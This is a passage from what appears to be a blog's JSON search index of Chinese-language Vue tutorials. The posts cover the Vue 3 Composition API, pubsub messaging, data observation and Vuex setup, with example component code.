&#125;)&#125;\n\n2.watch函数\n与Vue2.x中watch配置功能一致\n\n两个小“坑”：\n\n监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。\n监视reactive定义的响应式数据中某个属性时：deep配置有效。\n\n//情况一：监视ref定义的响应式数据watch(sum,(newValue,oldValue)=&gt;&#123;\tconsole.log(&#x27;sum变化了&#x27;,newValue,oldValue)&#125;,&#123;immediate:true&#125;)//情况二：监视多个ref定义的响应式数据watch([sum,msg],(newValue,oldValue)=&gt;&#123;\tconsole.log(&#x27;sum或msg变化了&#x27;,newValue,oldValue)&#125;) /* 情况三：监视reactive定义的响应式数据\t\t\t若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！\t\t\t若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 */watch(person,(newValue,oldValue)=&gt;&#123;\tconsole.log(&#x27;person变化了&#x27;,newValue,oldValue)&#125;,&#123;immediate:true,deep:false&#125;) //此处的deep配置不再奏效//情况四：监视reactive定义的响应式数据中的某个属性watch(()=&gt;person.job,(newValue,oldValue)=&gt;&#123;\tconsole.log(&#x27;person的job变化了&#x27;,newValue,oldValue)&#125;,&#123;immediate:true,deep:true&#125;) //情况五：监视reactive定义的响应式数据中的某些属性watch([()=&gt;person.job,()=&gt;person.name],(newValue,oldValue)=&gt;&#123;\tconsole.log(&#x27;person的job变化了&#x27;,newValue,oldValue)&#125;,&#123;immediate:true,deep:true&#125;)//特殊情况watch(()=&gt;person.job,(newValue,oldValue)=&gt;&#123;    console.log(&#x27;person的job变化了&#x27;,newValue,oldValue)&#125;,&#123;deep:true&#125;) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效\n\n3.watchEffect函数\nwatch的套路是：既要指明监视的属性，也要指明监视的回调。\n\nwatchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。\n\nwatchEffect有点像computed：\n\n但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。\n而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。\n\n//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。watchEffect(()=&gt;&#123;    const x1 = sum.value    const x2 = person.age    console.log(&#x27;watchEffect配置的回调执行了&#x27;)&#125;)\n\n8.生命周期vue2.x的生命周期vue3.0的生命周期\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n1\n\nVue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：\nbeforeDestroy改名为 beforeUnmount\ndestroyed改名为 unmounted\n\n\nVue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：\nbeforeCreate&#x3D;&#x3D;&#x3D;&gt;setup()\ncreated&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;setup()\nbeforeMount &#x3D;&#x3D;&#x3D;&gt;onBeforeMount\nmounted&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;onMounted\nbeforeUpdate&#x3D;&#x3D;&#x3D;&gt;onBeforeUpdate\nupdated &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;onUpdated\nbeforeUnmount &#x3D;&#x3D;&gt;onBeforeUnmount\nunmounted &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;onUnmounted\n\n\n\n9.自定义hook函数\n什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。\n\n类似于vue2.x中的mixin。\n\n自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。\n\n\n10.toRef\n作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。\n\n语法：const name = toRef(person,&#39;name&#39;)\n\n应用:   要将响应式对象中的某个属性单独提供给外部使用时。\n\n扩展：toRefs 与toRef功能一致，但可以批量创建多个 ref 对象，语法：toRefs(person)\n\n\n三、其它 Composition API1.shallowReactive 与 shallowRef\nshallowReactive：只处理对象最外层属性的响应式（浅响应式）。\n\nshallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。\n\n什么时候使用?\n\n如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 &#x3D;&#x3D;&#x3D;&gt; shallowReactive。\n如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 &#x3D;&#x3D;&#x3D;&gt; shallowRef。\n\n\n\n2.readonly 与 shallowReadonly\nreadonly: 让一个响应式数据变为只读的（深只读）。\nshallowReadonly：让一个响应式数据变为只读的（浅只读）。\n应用场景: 不希望数据被修改时。\n\n3.toRaw 与 markRaw\ntoRaw：\n作用：将一个由reactive生成的响应式对象转为普通对象。\n使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。\n\n\nmarkRaw：\n作用：标记一个对象，使其永远不会再成为响应式对象。\n应用场景:\n有些值不应被设置为响应式的，例如复杂的第三方类库等。\n当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。\n\n\n\n\n\n4.customRef\n作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。\n\n实现防抖效果：\n&lt;template&gt;\t&lt;input type=&quot;text&quot; v-model=&quot;keyword&quot;&gt;\t&lt;h3&gt;&#123;&#123;keyword&#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;ref,customRef&#125; from &#x27;vue&#x27;\texport default &#123;\t\tname:&#x27;Demo&#x27;,\t\tsetup()&#123;\t\t\t// let keyword = ref(&#x27;hello&#x27;) //使用Vue准备好的内置ref\t\t\t//自定义一个myRef\t\t\tfunction myRef(value,delay)&#123;\t\t\t\tlet timer\t\t\t\t//通过customRef去实现自定义\t\t\t\treturn customRef((track,trigger)=&gt;&#123;\t\t\t\t\treturn&#123;\t\t\t\t\t\tget()&#123;\t\t\t\t\t\t\ttrack() //告诉Vue这个value值是需要被“追踪”的\t\t\t\t\t\t\treturn value\t\t\t\t\t\t&#125;,\t\t\t\t\t\tset(newValue)&#123;\t\t\t\t\t\t\tclearTimeout(timer)\t\t\t\t\t\t\ttimer = setTimeout(()=&gt;&#123;\t\t\t\t\t\t\t\tvalue = newValue\t\t\t\t\t\t\t\ttrigger() //告诉Vue去更新界面\t\t\t\t\t\t\t&#125;,delay)\t\t\t\t\t\t&#125;\t\t\t\t\t&#125;\t\t\t\t&#125;)\t\t\t&#125;\t\t\tlet keyword = myRef(&#x27;hello&#x27;,500) //使用程序员自定义的ref\t\t\treturn &#123;\t\t\t\tkeyword\t\t\t&#125;\t\t&#125;\t&#125;&lt;/script&gt;\n\n5.provide 与 inject\n\n\n作用：实现祖与后代组件间通信\n\n套路：父组件有一个 provide 选项来提供数据，后代组件有一个 inject 选项来开始使用这些数据\n\n具体写法：\n\n祖组件中：\nsetup()&#123;\t......    let car = reactive(&#123;name:&#x27;奔驰&#x27;,price:&#x27;40万&#x27;&#125;)    provide(&#x27;car&#x27;,car)    ......&#125;\n\n后代组件中：\nsetup(props,context)&#123;\t......    const car = inject(&#x27;car&#x27;)    return &#123;car&#125;\t......&#125;\n\n\n\n6.响应式数据的判断\nisRef: 检查一个值是否为一个 ref 对象\nisReactive: 检查一个对象是否是由 reactive 创建的响应式代理\nisReadonly: 检查一个对象是否是由 readonly 创建的只读代理\nisProxy: 检查一个对象是否是由 reactive 或者 readonly 方法创建的代理\n\n四、Composition API 的优势1.Options API 存在的问题使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。\n\n    \n\n\n     \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n2.Composition API 的优势我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。\n\n    \n\n\n    \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n五、新的组件1.Fragment\n在Vue2中: 组件必须有一个根标签\n在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中\n好处: 减少标签层级, 减小内存占用\n\n2.Teleport\n什么是Teleport？—— Teleport 是一种能够将我们的组件html结构移动到指定位置的技术。\n&lt;teleport to=&quot;移动位置&quot;&gt;\t&lt;div v-if=&quot;isShow&quot; class=&quot;mask&quot;&gt;\t\t&lt;div class=&quot;dialog&quot;&gt;\t\t\t&lt;h3&gt;我是一个弹窗&lt;/h3&gt;\t\t\t&lt;button @click=&quot;isShow = false&quot;&gt;关闭弹窗&lt;/button&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;&lt;/teleport&gt;\n\n3.Suspense\n等待异步组件时渲染一些额外内容，让应用有更好的用户体验\n\n使用步骤：\n\n异步引入组件\nimport &#123;defineAsyncComponent&#125; from &#x27;vue&#x27;const Child = defineAsyncComponent(()=&gt;import(&#x27;./components/Child.vue&#x27;))\n\n使用Suspense包裹组件，并配置好default 与 fallback\n&lt;template&gt;\t&lt;div class=&quot;app&quot;&gt;\t\t&lt;h3&gt;我是App组件&lt;/h3&gt;\t\t&lt;Suspense&gt;\t\t\t&lt;template v-slot:default&gt;\t\t\t\t&lt;Child/&gt;\t\t\t&lt;/template&gt;\t\t\t&lt;template v-slot:fallback&gt;\t\t\t\t&lt;h3&gt;加载中.....&lt;/h3&gt;\t\t\t&lt;/template&gt;\t\t&lt;/Suspense&gt;\t&lt;/div&gt;&lt;/template&gt;\n\n\n\n六、其他1.全局API的转移\nVue 2.x 有许多全局 API 和配置。\n\n例如：注册全局组件、注册全局指令等。\n//注册全局组件Vue.component(&#x27;MyButton&#x27;, &#123;  data: () =&gt; (&#123;    count: 0  &#125;),  template: &#x27;&lt;button @click=&quot;count++&quot;&gt;Clicked &#123;&#123; count &#125;&#125; times.&lt;/button&gt;&#x27;&#125;)//注册全局指令Vue.directive(&#x27;focus&#x27;, &#123;  inserted: el =&gt; el.focus()&#125;\n\n\nVue3.0中对这些API做出了调整：\n\n将全局的API，即：Vue.xxx调整到应用实例（app）上\n\n\n\n2.x 全局 API（Vue）\n3.x 实例 API (app)\n\n\n\nVue.config.xxxx\napp.config.xxxx\n\n\nVue.config.productionTip\n移除\n\n\nVue.component\napp.component\n\n\nVue.directive\napp.directive\n\n\nVue.mixin\napp.mixin\n\n\nVue.use\napp.use\n\n\nVue.prototype\napp.config.globalProperties\n\n\n\n\n\n\n2.其他改变\ndata选项应始终被声明为一个函数。\n\n过度类名的更改：\n\nVue2.x写法\n.v-enter,.v-leave-to &#123;  opacity: 0;&#125;.v-leave,.v-enter-to &#123;  opacity: 1;&#125;\n\nVue3.x写法\n.v-enter-from,.v-leave-to &#123;  opacity: 0;&#125;.v-leave-from,.v-enter-to &#123;  opacity: 1;&#125;\n\n\n移除keyCode作为 v-on 的修饰符，同时也不再支持config.keyCodes\n\n移除v-on.native修饰符\n\n父组件中绑定事件\n&lt;my-component  v-on:close=&quot;handleComponentEvent&quot;  v-on:click=&quot;handleNativeClickEvent&quot;/&gt;\n\n子组件中声明自定义事件\n&lt;script&gt;  export default &#123;    emits: [&#x27;close&#x27;]  &#125;&lt;/script&gt;\n\n\n移除过滤器（filter）\n\n过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。\n\n\n……\n\n\n","categories":["Vue"],"tags":["Vue3"]},{"title":"Vue（三）：el和data的两种写法","url":"/2022/04/01/Vue%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9Ael%E5%92%8Cdata%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%99%E6%B3%95/","content":"el有2种写法\n创建Vue实例对象的时候配置el属性\n先创建Vue实例，随后再通过vm.$mount(&#39;#root&#39;)指定el的值\n\ndata有2种写法\n对象式：data： { }\n\n函数式：data() { return { } }\n如何选择：目前哪种写法都可以，以后到组件时，data必须使用函数，否则会报错\n一个重要的原则\n由Vue管理的函数，一定不要写箭头函数，否则 this 就不再是Vue实例了\n\n\n&lt;script type=&quot;text/javascript&quot;&gt;    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。    // el的两种写法    // const v = new Vue(&#123;    // \t//el:&#x27;#root&#x27;, // 第一种写法    // \tdata: &#123;    // \t\tname:&#x27;cess&#x27;    // \t&#125;    // &#125;)    // console.log(v)    // v.$mount(&#x27;#root&#x27;) // 第二种写法    // data的两种写法    new Vue(&#123;        el: &#x27;#root&#x27;,        // data的第一种写法：对象式        // data:&#123;        // \tname:&#x27;cess&#x27;        // &#125;        //data的第二种写法：函数式        data() &#123;            console.log(&#x27;@@@&#x27;, this) // 此处的this是Vue实例对象            return &#123;                name: &#x27;cess&#x27;            &#125;        &#125;    &#125;)&lt;/script&gt;\n\n","categories":["Vue"],"tags":["el","data"]},{"title":"Vue（二十一）：Vue脚手架之消息的订阅与发布","url":"/2022/04/11/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8B%E6%B6%88%E6%81%AF%E7%9A%84%E8%AE%A2%E9%98%85%E4%B8%8E%E5%8F%91%E5%B8%83/","content":"消息订阅与发布(pubsub)消息订阅与发布（pubsub）消息订阅与发布是一种组件间通信的方式，适用于任意组件间通信（类似全局事件总线，用得不多）\n使用步骤\n安装pubsub：npm i pubsub-js\n\n引入：import pubsub from &#39;pubsub-js&#39;\n\n接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身\nexport default &#123;    methods: &#123;        demo(msgName, data) &#123;...&#125;    &#125;    ...    mounted() &#123;\t\t\tthis.pid = pubsub.subscribe(&#x27;xxx&#x27;,this.demo)    &#125;&#125;\n\n提供数据：pubsub.publish(&#39;xxx&#39;,data)\n\n最好在beforeDestroy钩子中，使用pubsub.unsubscribe(this.pid)取消订阅\n\n\n代码示例：\nsrc/components/School.vue\n&lt;template&gt;\t&lt;div class=&quot;school&quot;&gt;\t\t&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;\t\t&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport pubsub from &#x27;pubsub-js&#x27;\texport default &#123;\t\tname: &#x27;School&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tname:&#x27;尚硅谷&#x27;,\t\t\t\taddress:&#x27;北京&#x27;,\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\tdemo(msgName, data) &#123;\t\t\t\tconsole.log(&#x27;我是School组件，收到了数据：&#x27;,msgName, data)\t\t\t&#125;\t\t&#125;,\t\tmounted() &#123;\t\t\tthis.pubId = pubsub.subscribe(&#x27;demo&#x27;, this.demo) // 订阅消息\t\t&#125;,\t\tbeforeDestroy() &#123;\t\t\tpubsub.unsubscribe(this.pubId) // 取消订阅\t\t&#125;\t&#125;&lt;/script&gt;&lt;style scoped&gt;\t.school&#123;\t\tbackground-color: skyblue;\t\tpadding: 5px;\t&#125;&lt;/style&gt;\n\nsrc/components/Student.vue\n&lt;template&gt;  &lt;div class=&quot;student&quot;&gt;    &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学生性别：&#123;&#123;sex&#125;&#125;&lt;/h2&gt;    &lt;button @click=&quot;sendStudentName&quot;&gt;把学生名给School组件&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import pubsub from &#x27;pubsub-js&#x27;  export default &#123;    name:&#x27;Student&#x27;,    data() &#123;      return &#123;        name:&#x27;JOJO&#x27;,        sex:&#x27;男&#x27;,      &#125;    &#125;,    methods: &#123;      sendStudentName()&#123;        pubsub.publish(&#x27;demo&#x27;, this.name) // 发布消息      &#125;    &#125;  &#125;&lt;/script&gt;&lt;style scoped&gt;  .student&#123;    background-color: pink;    padding: 5px;    margin-top: 30px;  &#125;&lt;/style&gt;\n\n使用消息的订阅与发布优化Todo-List案例src/App.vue\n&lt;template&gt;&lt;div id=&quot;root&quot;&gt;  &lt;div class=&quot;todo-container&quot;&gt;    &lt;div class=&quot;todo-wrap&quot;&gt;      &lt;MyHeader @addTodo=&quot;addTodo&quot;/&gt;      &lt;MyList :todos=&quot;todos&quot;/&gt;      &lt;MyFooter :todos=&quot;todos&quot; @checkAllTodo=&quot;checkAllTodo&quot; @clearAllTodo=&quot;clearAllTodo&quot;/&gt;  \t&lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import pubsub from &#x27;pubsub-js&#x27;\t// 习惯第三方库写上面  import MyHeader from &#x27;./components/MyHeader.vue&#x27;  import MyList from &#x27;./components/MyList.vue&#x27;  import MyFooter from &#x27;./components/MyFooter.vue&#x27;  export default &#123;    name:&#x27;App&#x27;,    components: &#123; MyHeader,MyList,MyFooter &#125;,    data() &#123;      return &#123;        todos:JSON.parse(localStorage.getItem(&#x27;todos&#x27;)) || []      &#125;    &#125;,    methods:&#123;      //添加一个todo      addTodo(todoObj)&#123;        this.todos.unshift(todoObj)      &#125;,      //勾选or取消勾选一个todo      checkTodo(_,id)&#123;        this.todos.forEach((todo)=&gt;&#123;          if(todo.id === id) todo.done = !todo.done        &#125;)      &#125;,      //删除一个todo      deleteTodo(id)&#123;        this.todos = this.todos.filter(todo =&gt; todo.id !== id)      &#125;,      //全选or取消勾选      checkAllTodo(done)&#123;        this.todos.forEach(todo =&gt; todo.done = done)      &#125;,      //删除已完成的todo      clearAllTodo()&#123;        this.todos = this.todos.filter(todo =&gt; !todo.done)      &#125;    &#125;,    watch:&#123;      todos:&#123;        deep:true,        handler(value)&#123;          localStorage.setItem(&#x27;todos&#x27;,JSON.stringify(value))        &#125;      &#125;    &#125;,    mounted()&#123;      this.pubId = pubsub.subscribe(&#x27;checkTodo&#x27;,this.checkTodo)\t// 两种对比      this.$bus.$on(&#x27;deleteTodo&#x27;,this.deleteTodo)    &#125;,    beforeDestroy()&#123;      pubsub.unsubscribe(this.pubId)      this.$bus.$off(&#x27;deleteTodo&#x27;)    &#125;  &#125;&lt;/script&gt;&lt;style&gt;  ……&lt;/style&gt;\n\nsrc/components/myItem.vue\n&lt;template&gt;    &lt;li&gt;        &lt;label&gt;            &lt;input type=&quot;checkbox&quot; :checked=&quot;todo.done&quot; @click=&quot;handleCheck(todo.id)&quot;/&gt;            &lt;span&gt;&#123;&#123;todo.title&#125;&#125;&lt;/span&gt;        &lt;/label&gt;        &lt;button class=&quot;btn btn-danger&quot; @click=&quot;handleDelete(todo.id,todo.title)&quot;&gt;删除&lt;/button&gt;    &lt;/li&gt;&lt;/template&gt;&lt;script&gt;    import pubsub from &#x27;pubsub-js&#x27;    export default &#123;        name:&#x27;MyItem&#x27;,        props:[&#x27;todo&#x27;],        methods:&#123;            handleCheck(id)&#123;                                    pubsub.publish(&#x27;checkTodo&#x27;,id)            &#125;,            handleDelete(id,title)&#123;                if(confirm(&quot;确定删除任务：&quot;+title+&quot;吗？&quot;))&#123;                    this.$bus.$emit(&#x27;deleteTodo&#x27;,id)                &#125;            &#125;        &#125;    &#125;&lt;/script&gt;&lt;style scoped&gt;   ……&lt;/style&gt;\n\n","categories":["Vue"],"tags":["Vue CLI","组件通信","订阅与发布"]},{"title":"Vue（九）：数据监视","url":"/2022/04/02/Vue%EF%BC%88%E4%B9%9D%EF%BC%89%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9B%91%E8%A7%86/","content":"更新数据时的一个问题\nthis.persons[0] = &#123;id:&#39;001&#39;,name:&#39;马老师&#39;,age:50,sex:&#39;男&#39;&#125; \n更改data数据，Vue不监听，模板不改变\n\n\n&lt;title&gt;更新时的一个问题&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2&gt;人员列表&lt;/h2&gt;  &lt;button @click=&quot;updateMei&quot;&gt;更新马冬梅的信息&lt;/button&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;p.id&quot;&gt;      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;    &lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      persons: [        &#123; id: &#x27;001&#x27;, name: &#x27;马冬梅&#x27;, age: 30, sex: &#x27;女&#x27; &#125;,        &#123; id: &#x27;002&#x27;, name: &#x27;周冬雨&#x27;, age: 31, sex: &#x27;女&#x27; &#125;,        &#123; id: &#x27;003&#x27;, name: &#x27;周杰伦&#x27;, age: 18, sex: &#x27;男&#x27; &#125;,        &#123; id: &#x27;004&#x27;, name: &#x27;温兆伦&#x27;, age: 19, sex: &#x27;男&#x27; &#125;      ]    &#125;,    methods: &#123;      updateMei() &#123;        // this.persons[0].name = &#x27;马老师&#x27;\t//奏效        // this.persons[0].age = 50\t\t\t\t//奏效        // this.persons[0].sex = &#x27;男&#x27;\t\t\t//奏效        // this.persons[0] = &#123;id:&#x27;001&#x27;,name:&#x27;马老师&#x27;,age:50,sex:&#x27;男&#x27;&#125; //不奏效        this.persons.splice(0, 1, &#123; id: &#x27;001&#x27;, name: &#x27;马老师&#x27;, age: 50, sex: &#x27;男&#x27; &#125;)      &#125;    &#125;  &#125;)&lt;/script&gt;\n\n模拟一个数据检测let data = &#123;  name: &#x27;尚硅谷&#x27;,  address: &#x27;北京&#x27;,&#125;function Observer(obj) &#123;  // 汇总对象中所有的属性形成一个数组  const keys = Object.keys(obj)  // 遍历  keys.forEach((k) =&gt; &#123;    Object.defineProperty(this, k, &#123;      get() &#123;        return obj[k]      &#125;,      set(val) &#123;        console.log(`$&#123;k&#125;被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)        obj[k] = val      &#125;    &#125;)  &#125;)&#125;// 创建一个监视的实例对象，用于监视data中属性的变化const obs = new Observer(data)console.log(obs)// 准备一个vm实例对象let vm = &#123;&#125;vm._data = data = obs\n\n原理（数据劫持）\nvue会监视data中所有层次的数据\n\n如何监测对象中的数据？ \n通过setter实现监视，且要在new Vue()时就传入要监测的数据\n\n对象创建后追加的属性，Vue默认不做响应式处理 (响应式：有get、set)\n\n如需给后添加的属性做响应式，请使用如下API\nVue.set(target,propertyName/index,value)\nvm.$set(target,propertyName/index,value)\n\n\n\n如何监测数组中的数据？ \n通过包裹数组更新元素的方法实现，本质就是做了两件事\n\n调用原生对应的方法对数组进行更新\n重新解析模板，进而更新页面\n\n\n在Vue修改数组中的某个元素一定要用如下方法\n\n使用这些API：push() pop() unshift() shift() splice() sort() reverse()这几个方法被Vue重写了\nVue.set()或vm.$set()\n\n\n特别注意：Vue.set() 和 vm.$set() 不能给vm或vm的根数据对象（_data等）添加属性\n\n\n&lt;title&gt;总结数据监视&lt;/title&gt;&lt;style&gt;button &#123;margin-top: 10px;&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h1&gt;学生信息&lt;/h1&gt;  &lt;button @click=&quot;student.age++&quot;&gt;年龄+1岁&lt;/button&gt; &lt;br /&gt;  &lt;button @click=&quot;addSex&quot;&gt;添加性别属性，默认值：男&lt;/button&gt; &lt;br /&gt;  &lt;button @click=&quot;student.sex = &#x27;未知&#x27; &quot;&gt;修改性别&lt;/button&gt; &lt;br /&gt;  &lt;button @click=&quot;addFriend&quot;&gt;在列表首位添加一个朋友&lt;/button&gt; &lt;br /&gt;  &lt;button @click=&quot;updateFirstFriendName&quot;&gt;修改第一个朋友的名字为：张三&lt;/button&gt; &lt;br /&gt;  &lt;button @click=&quot;addHobby&quot;&gt;添加一个爱好&lt;/button&gt; &lt;br /&gt;  &lt;button @click=&quot;updateHobby&quot;&gt;修改第一个爱好为：开车&lt;/button&gt; &lt;br /&gt;  &lt;button @click=&quot;removeSmoke&quot;&gt;过滤掉爱好中的抽烟&lt;/button&gt; &lt;br /&gt;  &lt;h3&gt;姓名：&#123;&#123; student.name &#125;&#125;&lt;/h3&gt;  &lt;h3&gt;年龄：&#123;&#123; student.age &#125;&#125;&lt;/h3&gt;  &lt;h3 v-if=&quot;student.sex&quot;&gt;性别：&#123;&#123;student.sex&#125;&#125;&lt;/h3&gt;  &lt;h3&gt;爱好：&lt;/h3&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(h,index) in student.hobby&quot; :key=&quot;index&quot;&gt;&#123;&#123; h &#125;&#125; &lt;/li&gt;  &lt;/ul&gt;  &lt;h3&gt;朋友们：&lt;/h3&gt;  &lt;ul&gt;    &lt;li v-for=&quot;(f,index) in student.friends&quot; :key=&quot;index&quot;&gt;&#123;&#123; f.name &#125;&#125;--&#123;&#123; f.age &#125;&#125;&lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      student: &#123;        name: &#x27;tom&#x27;,        age: 18,        hobby: [&#x27;抽烟&#x27;, &#x27;喝酒&#x27;, &#x27;烫头&#x27;],        friends: [          &#123; name: &#x27;jerry&#x27;, age: 35 &#125;,          &#123; name: &#x27;tony&#x27;, age: 36 &#125;        ]      &#125;    &#125;,    methods: &#123;      addSex() &#123;        // Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)        this.$set(this.student, &#x27;sex&#x27;, &#x27;男&#x27;)      &#125;,      addFriend() &#123;        this.student.friends.unshift(&#123; name: &#x27;jack&#x27;, age: 70 &#125;)      &#125;,      updateFirstFriendName() &#123;        this.student.friends[0].name = &#x27;张三&#x27;      &#125;,      addHobby() &#123;        this.student.hobby.push(&#x27;学习&#x27;)      &#125;,      updateHobby() &#123;        // this.student.hobby.splice(0,1,&#x27;开车&#x27;)        // Vue.set(this.student.hobby,0,&#x27;开车&#x27;)        this.$set(this.student.hobby, 0, &#x27;开车&#x27;)      &#125;,      removeSmoke() &#123;        this.student.hobby = this.student.hobby.filter((h) =&gt; &#123;          return h !== &#x27;抽烟&#x27;        &#125;)      &#125;    &#125;  &#125;)\n\n\n","categories":["Vue"],"tags":["数据监视"]},{"title":"Vue（二十七）：Vuex","url":"/2022/04/12/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%89%EF%BC%9AVuex/","content":"理解VuexVuex是什么\n概念：专门在Vue中实现集中式状态（即数据）管理的一个Vue插件，对Vue应用中多个组件的共享状态进行集中式的管理（读&#x2F;写），也是一种组件间通信的方式，且适用于任意组件间通信\nVuex Github地址\n\n\n\n什么时候使用Vuex\n多个组件依赖于同一状态\n来自不同组件的行为需要变更同一状态\n\nVuex 工作原理图\n求和案例使用纯vue编写\nsrc/App.vue\n&lt;template&gt;  &lt;div&gt;    &lt;Count/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Count from &quot;./components/Count.vue&quot;;export default &#123;  name: &quot;App&quot;,  components: &#123; Count &#125;,&#125;;&lt;/script&gt;\n\nsrc/components/Count.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h2&gt;    &lt;select v-model.number=&quot;n&quot;&gt;      &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;      &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;      &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;    &lt;/select&gt;    &lt;button @click=&quot;increment&quot;&gt;+&lt;/button&gt;    &lt;button @click=&quot;decrement&quot;&gt;-&lt;/button&gt;    &lt;button @click=&quot;incrementOdd&quot;&gt;当前求和为奇数再加&lt;/button&gt;    &lt;button @click=&quot;incrementWait&quot;&gt;等一等再加&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name: &quot;Count&quot;,    data() &#123;      return &#123;        sum: 0, // 当前的和        n: 1, // 用户选择的数字      &#125;;    &#125;,    methods: &#123;      increment() &#123;        this.sum += this.n;      &#125;,      decrement() &#123;        this.sum -= this.n;      &#125;,      incrementOdd() &#123;        if (this.sum % 2) &#123;          this.sum += this.n;        &#125;      &#125;,      incrementWait() &#123;        setTimeout(() =&gt; &#123;          this.sum += this.n;        &#125;, 500);      &#125;,    &#125;,  &#125;;&lt;/script&gt;&lt;style&gt;  button &#123;margin-left: 5px;&#125;&lt;/style&gt;\n\n搭建Vuex环境\n下载安装vuex：npm i vuex\n\n创建src/store/index.js该文件用于创建Vuex中最为核心的store\nimport Vue from &#x27;vue&#x27;import Vuex from &#x27;vuex&#x27;\t// 引入VuexVue.use(Vuex)\t// 应用Vuex插件const actions = &#123;&#125;\t\t// 准备actions——用于响应组件中的动作const mutations = &#123;&#125;\t// 准备mutations——用于操作数据（state）const state = &#123;&#125;\t\t\t// 准备state——用于存储数据// 创建并暴露storeexport default new Vuex.Store(&#123;\tactions,\tmutations,\tstate,&#125;)\n\n在src/main.js中创建vm时传入store配置项\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import store from &#x27;./store&#x27;\t// 引入storeVue.config.productionTip = falsenew Vue(&#123;\tel: &#x27;#app&#x27;,\trender: h =&gt; h(App),\tstore,\t\t\t\t\t\t\t\t\t\t// 配置项添加store\tbeforeCreate() &#123;\t\tVue.prototype.$bus = this\t&#125;&#125;)\n\n使用Vuex编写 